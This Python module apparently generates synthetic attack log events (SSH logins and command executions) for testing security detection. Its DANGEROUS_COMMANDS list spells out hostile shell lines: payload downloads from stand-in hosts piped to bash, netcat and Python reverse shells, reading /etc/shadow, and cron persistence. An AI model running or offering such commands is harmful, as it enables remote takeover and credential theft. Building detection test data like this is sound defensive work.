import random
from datetime import datetime, timezone, timedelta
from utils.ip_pool import get_attacker_ip, get_hostname, get_trusted_ip

DANGEROUS_COMMANDS = [
    ("wget http://malicious.example.com/payload.sh -O /tmp/.hidden_x", "high"),
    ("curl -s http://c2.example.com/beacon | bash", "critical"),
    ("nc -e /bin/bash 10.0.0.1 4444", "critical"),
    ("chmod 777 /etc/passwd", "medium"),
    ("cat /etc/shadow", "high"),
    ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'", "critical"),
    ("base64 -d /tmp/.enc | bash", "critical"),
    ("crontab -l > /tmp/.cron_bak && echo '* * * * * /tmp/.x' >> /tmp/.cron_bak", "high"),
    ("/tmp/.hidden_x &", "high"),
    ("find / -perm -4000 -type f 2>/dev/null", "medium"),
]

INTERNAL_USERS = ["alice", "bob", "carlos", "diana", "engineer1"]


def generate_burst() -> list[dict]:
    attacker = get_attacker_ip()
    ip = attacker["ip"]
    hostname = get_hostname()
    username = random.choice(INTERNAL_USERS)
    now = datetime.now(timezone.utc)

    events = []

    # Optional: preceding login event to show the session establishment
    if random.random() < 0.6:
        port = random.randint(49152, 65535)
        ts = now - timedelta(seconds=random.uniform(5, 30))
        events.append({
            "@timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "log_type": "auth",
            "source_ip": ip,
            "source_country": attacker["country"],
            "source_asn": attacker["asn"],
            "username": username,
            "action": "ssh_login",
            "status": "success",
            "hostname": hostname,
            "pid": random.randint(10000, 65000),
            "port": port,
            "message": f"Accepted password for {username} from {ip} port {port} ssh2",
            "scenario": "command_exec_login",
        })

    # 1-3 dangerous commands in the same session
    cmd_count = random.randint(1, 3)
    sampled = random.sample(DANGEROUS_COMMANDS, min(cmd_count, len(DANGEROUS_COMMANDS)))
    for i, (cmd, _severity) in enumerate(sampled):
        ts = now - timedelta(seconds=random.uniform(0, 10))
        events.append({
            "@timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "log_type": "command",
            "source_ip": ip,
            "source_country": attacker["country"],
            "source_asn": attacker["asn"],
            "username": username,
            "action": "command_execution",
            "status": "executed",
            "hostname": hostname,
            "pid": random.randint(10000, 65000),
            "command": cmd,
            "message": f"Command executed by {username} on {hostname}: {cmd}",
            "scenario": "command_exec",
        })

    return sorted(events, key=lambda e: e["@timestamp"])
